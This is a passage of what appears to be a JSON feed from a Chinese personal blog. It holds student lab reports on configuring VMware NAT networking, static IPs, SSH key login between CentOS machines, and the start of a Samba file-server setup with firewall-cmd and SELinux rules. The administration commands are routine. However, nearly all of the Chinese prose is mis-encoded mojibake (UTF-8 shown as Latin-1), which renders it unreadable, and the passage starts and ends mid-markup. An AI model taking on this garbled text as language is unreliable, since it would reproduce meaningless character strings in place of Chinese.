href=\"#1è™šæ‹Ÿæœºé…ç½®ä¸ºåŠ¨æ€ipåœ°å€\">#</a> ï¼ˆ1ï¼‰è™šæ‹Ÿæœºé…ç½®ä¸ºåŠ¨æ€ IP åœ°å€</h5>\n<ol>\n<li>\n<p>ç‚¹å‡» vm ç¼–è¾‘ï¼Œç‚¹å‡»è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzI3MTkzNDAucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914232719340.png</span>&quot; alt=&quot;image-20220914232719340&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>å‘ç°éœ€è¦ç®¡ç†å‘˜ç‰¹æƒæ‰èƒ½æ›´æ”¹ï¼Œç‚¹å‡»æ›´æ”¹è®¾ç½®</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzI4NDgxODcucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914232848187.png</span>&quot; alt=&quot;image-20220914232848187&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>è¿›å…¥åï¼Œé€‰æ‹© VMnet8ï¼Œé€‰æ‹© NAT æ¨¡å¼ï¼Œå¼€å¯ DHCPï¼Œå°†å­ç½‘ ip ç½‘æ®µæ”¹æˆæˆ‘çš„å­¦å·åä¸¤ä½ 09ï¼Œæœ€åç‚¹å‡»ç¡®å®š</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzM0MDk1NTEucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914233409551.png</span>&quot; alt=&quot;image-20220914233409551&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>ç­‰å¾…åŠ è½½å®Œæˆåï¼ŒæŸ¥çœ‹è™šæ‹Ÿç½‘å¡çš„ IP</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzM5MjA5MjUucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914233920925.png</span>&quot; alt=&quot;image-20220914233920925&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>æŸ¥çœ‹è™šæ‹Ÿæœº ipï¼Œè¿™é‡Œå‘ç° ip åœ°å€çš„ç½‘æ®µæ²¡æœ‰æ›´æ”¹ï¼Œé‡å¯åä¹Ÿæ²¡æœ‰æ”¹å˜</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQwMTgxMzAucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234018130.png</span>&quot; alt=&quot;image-20220914234018130&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>è¿™é‡Œå‘ç°ç‰©ç†ä¸»æœºçš„ç½‘æ®µä¹Ÿæ˜¯ 0ï¼Œåˆ¤æ–­åº”è¯¥æ˜¯è¿™å° Linux è™šæ‹Ÿæœºçš„ç½‘ç»œé“¾æ¥æ¨¡å¼è¿˜æ˜¯æ¡¥æ¥æ²¡æœ‰æ”¹æˆ NAT</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQxNTUwMjQucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234155024.png</span>&quot; alt=&quot;image-20220914234155024&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>æŸ¥çœ‹æœ¬ Linux è®¾ç½®ä¸­çš„ç½‘ç»œé€‚é…å™¨ï¼Œå‘ç°æ˜¯æ¡¥æ¥æ¨¡å¼ï¼Œè¿™é‡Œæ›´æ”¹ä¸º NAT</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQ0MjM3NTcucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234423757.png</span>&quot; alt=&quot;image-20220914234423757&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>æ›´æ”¹å®Œæˆé‡æ–°å¯åŠ¨è™šæ‹Ÿæœºï¼ŒæŸ¥çœ‹ ip åœ°å€ï¼Œç½‘æ®µå˜æ›´ä¸€è‡´</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQ1MjUxMTIucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234525112.png</span>&quot; alt=&quot;image-20220914234525112&quot; style=&quot;zoom: 80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>æµ‹è¯• Linux å’Œä¸»æœºçš„è¿é€šæ€§</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234633267.png\" alt=\"image-20220914234633267\" /></p>\n</li>\n</ol>\n<h5 id=\"2è™šæ‹Ÿæœºé…ç½®ä¸ºé™æ€ipåœ°å€\"><a class=\"anchor\" href=\"#2è™šæ‹Ÿæœºé…ç½®ä¸ºé™æ€ipåœ°å€\">#</a> ï¼ˆ2ï¼‰è™šæ‹Ÿæœºé…ç½®ä¸ºé™æ€ IP åœ°å€</h5>\n<ol>\n<li>\n<p>è¿›å…¥ /etc/sysconfig/network-scripts/ ç›®å½•æ‰“å¼€ç½‘å¡é…ç½®æ–‡ä»¶ ifcfg-ens33</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzU1MDI0MDcucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914235502407.png</span>&quot; alt=&quot;image-20220914235502407&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>æ‰“å¼€åè¾“å…¥ i è¿›å…¥æ’å…¥æ¨¡å¼ï¼Œæ›´æ”¹ç½‘å¡é…ç½®æ–‡ä»¶</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDAzMTI3NTgucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000312758.png</span>&quot; alt=&quot;image-20220915000312758&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">BOOTPROTO&#x3D;&quot;static&quot;       &#x2F;&#x2F;ä¿®æ”¹ï¼šå°†dhcpä¿®æ”¹ä¸ºstaticï¼Œä¿®æ”¹åä¸ºBOOTPROTO&#x3D;static\nONBOOT&#x3D;yes               &#x2F;&#x2F;ä¿®æ”¹ä¸ºyes, ç½‘å¡å¼€æœºè‡ªå¯åŠ¨\n\nIPADDR&#x3D;&quot;xxx.xxx.xxx.xxx&quot;    &#x2F;&#x2F;æ–°å¢ï¼šé…ç½®é™æ€IPåœ°å€ï¼ŒæŒ‰éœ€é…ç½®\nNETMASK&#x3D;&quot;255.xxx.xxx.xxx&quot;   &#x2F;&#x2F;æ–°å¢ï¼šé…ç½®å­ç½‘æ©ç \nGATEWAY&#x3D;&quot;xxx.xxx.xxx.xxx&quot;   &#x2F;&#x2F;æ–°å¢ï¼šé…ç½®ç½‘å…³\nDNS1&#x3D;&quot;xxx.xxx.xxx.xxx&quot;        &#x2F;&#x2F;æ–°å¢ï¼šé…ç½®DNS<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>ç‚¹å‡» Escï¼Œé”®å…¥:wq ä¿å­˜å¹¶é€€å‡ºï¼Œé‡å¯ç½‘å¡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000632584.png\" alt=\"image-20220915000632584\" /></p>\n</li>\n<li>\n<p>å†æ¬¡æŸ¥çœ‹è™šæ‹Ÿæœºçš„ IP åœ°å€ï¼Œå‘ç°æ›´æ”¹æˆåŠŸ</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDA3MDk1NzYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000709576.png</span>&quot; alt=&quot;image-20220915000709576&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>æµ‹è¯• Linux å’Œä¸»æœºçš„è¿é€šæ€§</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000755532.png\" alt=\"image-20220915000755532\" /></p>\n</li>\n</ol>\n<h4 id=\"23-è¿œç¨‹è®¿é—®centos-7ç³»ç»Ÿ\"><a class=\"anchor\" href=\"#23-è¿œç¨‹è®¿é—®centos-7ç³»ç»Ÿ\">#</a> 2.3 è¿œç¨‹è®¿é—® CentOS 7 ç³»ç»Ÿ</h4>\n<ol>\n<li>\n<p>ç‚¹å‡» session</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDExMDQ3NzgucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001104778.png</span>&quot; alt=&quot;image-20220915001104778&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>é€‰æ‹© sshï¼Œè¾“å…¥ IP åœ°å€ï¼Œä¸»æœºå</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDExNTMzOTUucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001153395.png</span>&quot; alt=&quot;image-20220915001153395&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n</li>\n<li>\n<p>ç‚¹å‡» ok åï¼Œé”®å…¥å¯†ç </p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDEzMzQ3MjUucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001334725.png</span>&quot; alt=&quot;image-20220915001334725&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n</ol>\n<h4 id=\"24-ä¸¤å°linuxå¯†é’¥ç™»é™†\"><a class=\"anchor\" href=\"#24-ä¸¤å°linuxå¯†é’¥ç™»é™†\">#</a> 2.4 ä¸¤å° Linux å¯†é’¥ç™»é™†</h4>\n<ol>\n<li>\n<p>å…³é—­è™šæ‹Ÿæœºï¼Œåˆ›å»ºä¸€ä¸ªå…‹éš†</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDIwMTE4OTcucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002011897.png</span>&quot; alt=&quot;image-20220915002011897&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>æ‰“å¼€ä¸¤å°è™šæ‹Ÿæœºï¼ŒæŸ¥çœ‹å…‹éš†æœºçš„ ip åœ°å€</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDIxMjg0ODUucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002128485.png</span>&quot; alt=&quot;image-20220915002128485&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>è¿™é‡Œæ›´æ”¹ç½‘å¡é…ç½®ï¼Œä½¿å¾—ä¸¤ä¸ªè™šæ‹Ÿæœºçš„ IP åœ°å€ä¸åŒ</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDI1NTQyMDAucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002554200.png</span>&quot; alt=&quot;image-20220915002554200&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n</li>\n<li>\n<p>åŒæ ·ä½¿ç”¨ MobaXterm è¿æ¥</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDI4NDgwOTQucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002848094.png</span>&quot; alt=&quot;image-20220915002848094&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>ä½¿ç”¨ ssh-keygen å‘½ä»¤ç”Ÿæˆå¯†é’¥å¯¹å„¿</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMTM4MTY2MDIucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915013816602.png</span>&quot; alt=&quot;image-20220915013816602&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>å°†å…¬é’¥ /root/.ssh/id_rsa.pub çš„å†…å®¹å­˜å…¥å¦ä¸€å°è™šæ‹Ÿæœºçš„ /root/.ssh/authorized_keys</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMTQxMTg0ODEucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915014118481.png</span>&quot; alt=&quot;image-20220915014118481&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n</li>\n<li>\n<p>ä¾¿å¯ä»¥ç›´æ¥ç™»å½•ï¼Œç›¸äº’ç™»å½•å®ç°</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915015619902.png\" alt=\"image-20220915015619902\" /></p>\n</li>\n</ol>\n<h4 id=\"25-ä½¿ç”¨å¿«ç…§ä¿å­˜å½“å‰çŠ¶æ€\"><a class=\"anchor\" href=\"#25-ä½¿ç”¨å¿«ç…§ä¿å­˜å½“å‰çŠ¶æ€\">#</a> 2.5 ä½¿ç”¨å¿«ç…§ä¿å­˜å½“å‰çŠ¶æ€</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001507112.png\" alt=\"image-20220915001507112\" /></p>\n<h3 id=\"3å®éªŒå°ç»“\"><a class=\"anchor\" href=\"#3å®éªŒå°ç»“\">#</a> 3. å®éªŒå°ç»“</h3>\n<p>ç»è¿‡æœ¬æ¬¡å®éªŒï¼Œå­¦ä¼šäº† nat æ¨¡å¼ä¸‹çš„åŠ¨æ€ ip å’Œé™æ€ ip åœ°å€çš„é…ç½®ï¼ŒåŠ æ·±äº†æˆ‘å¯¹æ¡¥æ¥å’Œ nat ä¸¤ç§æ¨¡å¼çš„ç†è§£ï¼ŒåŒºåˆ†äº†è™šæ‹Ÿç½‘å¡å’Œç‰©ç†ç½‘å¡çš„è”ç³»å’ŒåŒºåˆ«ï¼Œå­¦åˆ°äº†ä¸¤å° Linux ä¸»æœºçš„å…å¯†ç™»å½•æ–¹å¼</p>\n",
            "tags": [
                "ç½‘ç»œæœåŠ¡åº”ç”¨",
                "nat ipåˆ†é…"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/",
            "url": "https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/",
            "title": "Sambaå…±äº«",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"å®éªŒ2sambaæœåŠ¡å™¨é…ç½®\"><a class=\"anchor\" href=\"#å®éªŒ2sambaæœåŠ¡å™¨é…ç½®\">#</a> å®éªŒ 2ï¼šSamba æœåŠ¡å™¨é…ç½®</h2>\n<p><strong>å®éªŒç›®çš„</strong></p>\n<blockquote>\n<p>1ã€äº†è§£ Samba åè®®ï¼Œç†è§£ Samba çš„å·¥ä½œåŸç†</p>\n<p>3ã€ç†Ÿç»ƒæŒæ¡ Samba æœåŠ¡å™¨çš„é…ç½®å’Œæ•…éšœæ’é™¤çš„æ€è·¯ã€æ–¹æ³•æŠ€å·§</p>\n<p>4ã€æ·±å…¥ç†è§£ Linux çš„æ–‡ä»¶æƒé™ç®¡ç†</p>\n<p>4ã€æŒæ¡é˜²ç«å¢™ Firewall çš„åŸºæœ¬é…ç½®</p>\n<p>5ã€åˆæ­¥å­¦ä¼šé…ç½® SELinux</p>\n</blockquote>\n<p><strong>å®éªŒå‚è€ƒ</strong></p>\n<blockquote>\n<p>å®éªŒæ­¥éª¤å¯å‚è€ƒã€Š2-1-Samba æœåŠ¡å™¨é…ç½®åŒ¿åå…±äº«.pdfã€‹æ–‡ä»¶ã€‚</p>\n<p>å®éªŒæ­¥éª¤å¯å‚è€ƒã€Š2-2-Samba æœåŠ¡å™¨é…ç½®_å®‰å…¨å…±äº«.pdfã€‹æ–‡ä»¶ã€‚</p>\n</blockquote>\n<h3 id=\"1å®éªŒè¦æ±‚\"><a class=\"anchor\" href=\"#1å®éªŒè¦æ±‚\">#</a> 1. å®éªŒè¦æ±‚</h3>\n<blockquote>\n<p>ä»»åŠ¡ 1ï¼šé…ç½® yum æºï¼Œä½¿ç”¨å…‰ç›˜é•œåƒæˆ–è€…é˜¿é‡Œäº‘çš„ YUM æºå®‰è£… Samba æœåŠ¡åŒ…ã€‚<br />\nä»»åŠ¡ 2ï¼šSamba åŒ¿åè®¿é—®ï¼ˆä¸éœ€è¦å¯†ç çš„åˆ†äº«ï¼‰ï¼Œç‰©ç†ä¸»æœºåŒ¿åè®¿é—® Samba æœåŠ¡å™¨ä¸Šçš„å…±äº«ç›®å½• /tmp å’Œ /shareã€‚</p>\n<p>ä»»åŠ¡ 3ï¼šSamba æœåŠ¡å™¨é…ç½®_å®‰å…¨å…±äº«ã€‚ä¸€ä¸ªå°ç»„ï¼ˆå…¬å¸æŠ€æœ¯éƒ¨ï¼‰å…±åŒå¼€å‘ä¸€ä¸ªé¡¹ç›®ï¼Œæ‰€æœ‰çš„é¡¹ç›®æ–‡ä»¶éƒ½å­˜æ”¾åœ¨ Samba æœåŠ¡å™¨ä¸€ä¸ªå…±äº«ç›®å½• (/home/project)ã€‚è¦æ±‚ï¼š</p>\n<ul>\n<li>å…¬å¸æ¯ä½æˆå‘˜ä½¿ç”¨ç”¨æˆ·å / å¯†ç è®¿é—® Samba å…±äº«æœåŠ¡å™¨ï¼Œä½†åªæœ‰æŠ€æœ¯éƒ¨çš„æˆå‘˜å¯ä»¥è®¿é—®éƒ¨é—¨çš„å…±äº«ç›®å½• /home/projectã€‚</li>\n<li>æŠ€æœ¯éƒ¨æ¯ä½æˆå‘˜åœ¨å…±äº«ç›®å½• /home/project æ–°å»ºçš„æ–‡ä»¶éƒ½å±äºæŠ€æœ¯éƒ¨ç»„ã€‚</li>\n<li>æŠ€æœ¯éƒ¨æ¯ä½æˆå‘˜éƒ½å¯ä»¥å¯¹å…¶ä»–ç”¨æˆ·å»ºç«‹çš„æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œï¼Œä½†æ¯ä½ç”¨æˆ·åªèƒ½åˆ é™¤è‡ªå·±çš„æ–‡ä»¶ï¼Œä¸èƒ½åˆ é™¤å…¶ä»–ç”¨æˆ·å»ºç«‹çš„æ–‡ä»¶ã€‚</li>\n</ul>\n<p>å…¶ä»–è¦æ±‚ï¼š</p>\n<p>è™šæ‹Ÿæœºä¸»æœºåä¸º â€œSamba-xxxâ€ï¼Œå…¶ä¸­ xxx ä¸ºè‡ªå·±çš„å§“åæ‹¼éŸ³ç®€å†™ï¼›æµ‹è¯•å®¢æˆ·ç«¯çš„ä¸»æœºåä¿®æ”¹ä¸º â€œClient-xxxâ€</p>\n</blockquote>\n<h3 id=\"2å®éªŒè¿‡ç¨‹\"><a class=\"anchor\" href=\"#2å®éªŒè¿‡ç¨‹\">#</a> 2. å®éªŒè¿‡ç¨‹</h3>\n<h4 id=\"21-yumæºé…ç½®\"><a class=\"anchor\" href=\"#21-yumæºé…ç½®\">#</a> 2.1 yum æºé…ç½®</h4>\n<p>é¦–å…ˆå°†è¿›å…¥åˆ°é…ç½®ç›®å½•ï¼Œå°†åŸæœ‰çš„ä»“åº“æ–‡ä»¶è¿›è¡Œä¸€ä¸ªå¤‡ä»½</p>\n<p>å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹æ¥å­˜æ”¾å¤‡ä»½çš„æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾ 1-1</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTEzMDc2MTMucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022211307613.png</span>&quot; alt=&quot;image-20221022211307613&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p>â€‹\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tå›¾ 1-1ï¼Œå»ºç«‹æ–‡ä»¶å¤¹</p>\n<p>å°†æ–‡ä»¶ç§»åŠ¨è¿›å»åï¼Œé…ç½®ä¸€ä¸ªé˜¿é‡Œçš„ yum æºï¼Œå¦‚å›¾ 1-2</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTI0NDc0ODEucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022212447481.png</span>&quot; alt=&quot;image-20221022212447481&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p>â€‹                                                                                 å›¾ 1-2ï¼Œyum æºé…ç½®</p>\n<h4 id=\"22-sambaåŒ¿åå…±äº«\"><a class=\"anchor\" href=\"#22-sambaåŒ¿åå…±äº«\">#</a> 2.2 Samba åŒ¿åå…±äº«</h4>\n<h5 id=\"221-ç¯å¢ƒå‡†å¤‡\"><a class=\"anchor\" href=\"#221-ç¯å¢ƒå‡†å¤‡\">#</a> 2.2.1 ç¯å¢ƒå‡†å¤‡</h5>\n<p>åº”è€å¸ˆè¦æ±‚è¿™é‡Œä¸å…³é—­é˜²ç«å¢™å’Œ SELinux</p>\n<p>å»ºç«‹ä¸€ä¸ªå…±äº«ç›®å½• /publicï¼Œå®‰è£… samba æœåŠ¡ç¨‹åºåŒ…å¦‚å›¾ 2-1</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022213412121.png\" alt=\"image-20221022213412121\" /></p>\n<p>â€‹                                                                                 å›¾ 2-1ï¼Œç¯å¢ƒå‡†å¤‡</p>\n<h5 id=\"222-ä¿®æ”¹é…ç½®æ–‡ä»¶etcsambasmbconf\"><a class=\"anchor\" href=\"#222-ä¿®æ”¹é…ç½®æ–‡ä»¶etcsambasmbconf\">#</a> 2.2.2 ä¿®æ”¹é…ç½®æ–‡ä»¶ /etc/samba/smb.conf</h5>\n<p>è¿›å…¥ samba ç›®å½•ï¼Œå°†æºæ–‡ä»¶å¤‡ä»½ï¼Œä¿®æ”¹ smb.conf æ–‡ä»¶å¦‚å›¾ 2-2</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214043968.png\" alt=\"image-20221022214043968\" /></p>\n<p>â€‹                                                                    å›¾ 2-2ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶</p>\n<p>ä¿®æ”¹é…ç½®æ–‡ä»¶å†…å¦‚å¦‚ä¸‹å›¾ 2-3</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214220044.png\" alt=\"image-20221022214220044\" /></p>\n<p>â€‹                                                                      å›¾ 2-3ï¼Œé…ç½®æ–‡ä»¶å†…å®¹</p>\n<h5 id=\"223å¯åŠ¨ç¯å¢ƒ\"><a class=\"anchor\" href=\"#223å¯åŠ¨ç¯å¢ƒ\">#</a> 2.2.3 å¯åŠ¨ç¯å¢ƒ</h5>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">[root@Samba-lq samba]# testparm #è¯­æ³•æ£€æŸ¥\n[root@Samba-lq samba]# service nmb start #å¼€å¯nmbæœåŠ¡\n[root@Samba-lq samba]# service smb start #å¼€å¯smbæœåŠ¡<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>æ£€æŸ¥è¯­æ³•å¦‚ä¸‹å›¾ 2-4</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214900363.png\" alt=\"image-20221022214900363\" /></p>\n<p>â€‹                                                                          å›¾ 2-4ï¼Œè¯­æ³•æµ‹è¯•</p>\n<p>å¼€å¯ nmb å’Œ smb æœåŠ¡å¦‚å›¾ 2-5</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214957516.png\" alt=\"image-20221022214957516\" /></p>\n<p>â€‹                                                                          å›¾ 2-5ï¼Œå¼€å¯æœåŠ¡</p>\n<h5 id=\"224è®¾ç½®é˜²ç«å¢™è§„åˆ™å’Œselinuxè§„åˆ™\"><a class=\"anchor\" href=\"#224è®¾ç½®é˜²ç«å¢™è§„åˆ™å’Œselinuxè§„åˆ™\">#</a> 2.2.4 è®¾ç½®é˜²ç«å¢™è§„åˆ™å’Œ SELinux è§„åˆ™</h5>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">[root@Samba-lq samba]# firewall-cmd --permanent --zone&#x3D;public --add-service&#x3D;samba\n[root@Samba-lq samba]# firewall-cmd --reload\n[root@Samba-lq samba]# firewall-cmd --list-services\n[root@Samba-lq samba]# chcon -t samba_share_t &#x2F;public<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>é…ç½®å¦‚ä¸‹å›¾ 2-5</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221106832.png\" alt=\"image-20221022221106832\" /></p>\n<p>â€‹\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tå›¾ 2-5ï¼Œé…ç½®æ•ˆæœå›¾</p>\n<h5 id=\"225å…±äº«ç›®å½•è¿›å…¥è¦å¯†ç è§£å†³\"><a 